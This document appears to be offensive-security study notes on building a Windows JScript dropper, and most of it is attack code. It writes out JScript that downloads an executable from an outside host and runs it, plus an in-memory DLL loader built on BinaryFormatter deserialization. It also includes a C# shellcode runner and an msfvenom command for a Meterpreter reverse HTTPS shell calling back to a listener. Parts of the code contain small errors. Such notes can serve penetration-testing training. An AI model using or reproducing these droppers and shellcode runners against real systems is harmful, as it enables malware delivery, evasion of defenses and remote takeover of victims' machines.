# JScript Dropper
A simple example using Microsoft's JScript.
- Uses Windows Script Host
- Not shown in process explorer
- Can be double clicked
- Executing outside of browser bypasses existing security
- Detected in win 11

## Simple GET Request
```js
var url = 'http://10.10.10.10/x.exe'
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```
How it works:
- Uses `MSXML2.XMLHTTP`
- Based off `XML Core Services` and it's protocol parser.
- Present in all modern versions of windows


On successful response:
```js
if (Object.Status == 200) {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile('x.exe',2);
    Stream.Close();
}
var shell = new ActiveXObject('WScript.Shell').Run('x.exe');
```
- Open stream object
- set type to adTypeBinary (`1`) for binary content
- Use `Write` to save the response body
- Reset position to `0` which tells `Stream` to point to the beginning of it's content.
- Save to file
- Run the exe

## In Memory Execution
In order to execute in memory, we will need to access the win32 apis. There is no way to do this in JScript so we will need to use Powershell or C#.

### Compiling on Windows
First create a `program.cs` file containing a basic hello world.
```c
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Test {
    class Program {
        static void Main(string[] args) {
            Console.WriteLine("oh hey");
        }
    }
}
```

Compiling:
```sh
csc.exe /t:exe /out:program.exe program.cs
csc.exe /t:library /out:program.dll program.cs
```

## Running on Linux
If you chose to write these scripts on Linux, you'll need to do the following:

- Create your C# as usual
- `sudo apt install mono-complete`
- `mcs -out:outputfile.exe program.cs`
- `mono outputfile.exe`

## C# to JScript
DotNetToJscript is a good tool to convert C# to JScript. I have created a simplified version here: [DllEncoder.cs](./DllEncoder.cs)

### 1. Set the version of the .NET framework
```js
function setversion() {
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'
}
```

### 2. Debugging
```js
function debug(s) {
    WScript.Echo(s);
}
```

### 3. Decode Function
Base64 decoding function invoked through ActiveXObject:
```js
function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba,0,(length/4) * 3);
    ms.Position = 0;
    return ms;
}
```
- `GetByteCount_2` calculates the number of bytes required to encode the string
- `GetBytes_4` converts base64 string to byte array
- `FromBase64Transform` provides methods to covert base64 encoded data back to origin byte form
- `TransformFinalBlock` process byte array and converts from B64 to original binary form.
- `MemoryStream` object holds binary data
- `Write` byte array into memory stream. 
- `(length / 4) * 3 ` size of original binary data after decoding
- `Position = 0` resets the stream position to begining.
- Returns a memory stream object containing binary data

#### Base64 Explained
Binary Data to Base64
- Binary data is divided into chunks of 3 bytes.
- Each byte chunk is split into four 6 bit groups (total 24bit)
- Each 6-bit group is mapped to a base64 character

Base64 String Length:
- For every 3 bytes of binary data, encoding produces 4 characters
- The length of a base64 encoded string is approximately 4/3 the length of the original binary data

Decoding Base64:
For every 4 base64 characters, 3bytes of binary data are produced
- Divde by 4 for each 6 bit group
- Multiply by 3 for the byte chunks

### 4. Preparing payload
1. Compile a dll
```sh
csc.exe /t:library /out:program.dll program.cs
```

2. Encode it
Use the `DllEncoder.cs` script. The program expects your dll to be named `example.dll`. 

3. Populate Jscript.js
```js
var serialize_obj = '<BASE64ENCODEDPROGRAM.DLL>';
var entry_class = 'TestClass';
```

### 5. Create the JScript File
```js
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
```

## Full Script
```js
function setversion() {
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'
}

function debug(s) {}

function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba,0,(length/4) * 3);
    ms.Position = 0;
    return ms;
}

var serialized_obj = '<B64DATA>';
var entry_class = 'TestClass';

try {
    setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList);
    var d = fmt.Deserialize_2(stm);
    al.add(undefined);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
} catch (e) {
    debug(e.message);
}
```

To execute the method we'll use DynamicInvoke and CreateInstance.
- DynamicInvoke accepts an array of arguments
- But no arguments are required by TestClass

To pass an empty array to TestClass:
- Create ActiveXObject arraylist
- Add undefined object 
- Convert to array

## Win32 API Calls From C#
A proof of concept that imports MessageBoxA and class it from C#.
```c
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TestApp 
{

    class Program 
    {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args) 
        {
            MessageBox(IntPtr.Zero, "Test box", "caption entry",0);
        }
    }
}
```

## Shellcode Runner in C#
Use DllImport to import the 3 Win32 APIs and configure the appropriate argument data types. 
```c
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DemoApp {
    class Program 
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, Uint32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[770] {0xfc,0x48..};
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
The payload in the buf will be generated by msfvenom:
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.128 LPORT=443 EXITFUNC=thread -f csharp -o csrunner.cs
```
